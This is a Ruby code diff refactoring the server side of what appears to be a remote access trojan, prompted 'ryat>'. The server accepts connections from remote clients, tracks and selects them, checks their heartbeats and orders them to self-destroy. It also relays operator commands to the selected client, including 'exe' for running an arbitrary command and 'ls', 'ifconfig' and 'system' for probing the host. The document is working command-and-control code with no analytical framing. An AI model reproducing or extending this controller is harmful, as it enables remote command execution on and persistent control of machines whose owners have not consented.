@@ -3,8 +3,22 @@
 require 'socket'
 require 'colorize'
 
+class Client
+  attr_accessor :connection, :addr, :uid
+
+  def initialize(connection, addr, uid)
+    @connection = connection
+    @addr = addr
+    @uid = uid
+  end
+
+  def to_s
+    "ID: #{@uid.to_s} IP: #{@addr.to_s}".green
+  end
+end
+
 class Server
-  attr_accessor :client_count, :current_client, :clients
+  attr_accessor :client_count, :current_client
 
   def initialize(port)
     @client_count = 0
@@ -18,14 +32,15 @@ class Server
     loop do
       begin
         connection = @server.accept
-        client_id = client_count + 1
-        puts "\nNew Connection => ID: #{client_id} IP: #{connection.peeraddr[3]} ".green
+        client_id = @client_count + 1
 
         client = Client.new(
           connection,
           connection.peeraddr[3],
           client_id
         )
+        puts "\nNew connection => #{client}".green
+
         @clients[client_id] = client
         @client_count += 1
       rescue Exception => e
@@ -35,16 +50,9 @@ class Server
     end
   end
 
-  def help(server_cmds, client_cmds)
-    puts "Server Commands:".green
-    server_cmds.each { |gen| puts "- #{gen}" }
-    puts "\nClient Commands:".green
-    client_cmds.each { |cli| puts "- #{cli}" }
-  end
-
   def select_client(id)
     begin
-      self.current_client = @clients[id]
+      @current_client = @clients[id]
       raise NoMethodError if @current_client.nil?
       puts "Client #{id} selected".green
     rescue NoMethodError => e
@@ -57,9 +65,14 @@ class Server
   end
 
   def get_clients
-    conns = []
-    @clients.each_value { |c| conns << c }
-    conns
+    cli = []
+    @clients.each_value { |c| cli << c }
+    cli
+  end
+
+  def list_clients
+    return 'No clients available'.red if @clients.empty?
+    get_clients.each { |client| puts client }
   end
 
   def send_client(msg, client)
@@ -76,28 +89,23 @@ class Server
       len = client.connection.gets
       client.connection.read(len.to_i)
     rescue Exception => e
-      puts "#{e.message} CLIENT RECV HANG".red
-      return
+      puts e.message.red
+      puts e.backtrace.join("\n").red
     end
-  end
-
-  def list_clients
-    return 'No clients available'.red if @clients.empty?
-    str = ''
-    get_clients.each { |client| puts client }
-    str
   end
 
   def destroy_client(id)
     begin
       client = @clients[id]
       raise NoMethodError if client.nil?
+
       if @current_client
-        @current_client = nil if @current_client.uid == id
+        unselect if @current_client.uid == id
       end
 
       send_client('destroy', client)
       @clients.delete(id)
+      @client_count -= 1
       puts "Client #{id} destroyed".yellow
     rescue NoMethodError => e
       puts "Invalid id: #{id}\nEnter 'clients' to see available clients".red
@@ -105,24 +113,13 @@ class Server
   end
 
   def heartbeat
-    # Check if the client is still alive and responding
+    # Check if clients are still alive and responding, remove otherwise
     get_clients.each do |temp_client|
-      send_client('hearbeat', temp_client)
+      send_client('heartbeat', temp_client)
       beat = recv_client(temp_client)
-      if beat != 'alive'
-        destroy_client(temp_client.uid)
-      end
+      destroy_client(temp_client.uid) if beat != 'alive'
     end
     puts "Heartbeat Finished - All non-responding clients removed.".green
-  end
-
-  def hardexit
-    print "Exit server and destroy all clients? [y/n]: "
-    inp = $stdin.gets.chomp.downcase
-    if inp == 'yes' || inp == 'y'
-      get_clients.each { |client| send_client('destroy', client) }
-      exit(0)
-    end
   end
 
   def quit
@@ -130,36 +127,30 @@ class Server
     inp = $stdin.gets.chomp.downcase
     exit 0 if inp == 'yes' || inp == 'y'
   end
+
+  def hardexit
+    print "Exit server and destroy all clients? [y/n]: "
+    inp = $stdin.gets.chomp.downcase
+    if inp == 'yes' || inp == 'y'
+      get_clients.each { |client| send_client('destroy', client) }
+      exit 0
+    end
+  end
 end
 
-class Client
-  attr_accessor :connection, :addr, :uid
-
-  def initialize(connection, addr, uid)
-    @connection = connection
-    @addr = addr
-    @uid = uid
-  end
-
-  def to_s
-    result = "ID: #{@uid.to_s} IP: #{@addr.to_s}".green
-  end
+def help(server_cmds, client_cmds)
+  puts "Server Commands:".green
+  server_cmds.each { |gen| puts "- #{gen}" }
+  puts "\nClient Commands:".green
+  client_cmds.each { |cli| puts "- #{cli}" }
 end
 
 def get_input(prompt = 'ryat>')
   print "#{prompt} "
-  inp = $stdin.gets.chomp
+  $stdin.gets.chomp
 end
 
 def start
-  client_cmds = %w[
-    exe ls pwd pid ifconfig system
-  ]
-
-  server_cmds = %w[
-    help select unselect clients heartbeat history destroy hardexit exit
-  ]
-
   port = ARGV[0]
   port ||= 3200
 
@@ -171,6 +162,13 @@ def start
   Thread.new { server.run }
   puts "Sever started on port #{port}".green
 
+  client_cmds = %w[
+    exe ls pwd pid ifconfig system
+  ]
+
+  server_cmds = %w[
+    help select unselect clients heartbeat history destroy hardexit exit
+  ]
   loop do
     if server.current_client.nil?
       input = get_input
@@ -182,20 +180,21 @@ def start
     cmd, action = input.split(' ')
 
     if client_cmds.include?(input) && server.current_client.nil?
-      puts "Client specific command, select a client first (#{server.client_count} available)".red
+      puts "Client specific command used".red
+      puts "Select a client first (#{server.client_count} available)".red
       next
     end
 
     case cmd
     # Server Commands
     when 'help'
-      server.help(server_cmds, client_cmds)
+      help(server_cmds, client_cmds)
     when 'select'
       server.select_client(action.to_i)
     when 'unselect'
       server.unselect
     when 'clients'
-      puts server.list_clients
+      server.list_clients
     when 'heartbeat'
       server.heartbeat
     when 'hardexit'
@@ -213,7 +212,7 @@ def start
     # Client Commands
     when 'exe'
       next if action.nil?
-      server.send_client(input, server.current_client)
+      server.send_client(input.gsub('exe ', ''), server.current_client)
       data = server.recv_client(server.current_client)
     when 'ls', 'pwd', 'pid', 'ifconfig', 'system'
       server.send_client(cmd, server.current_client)
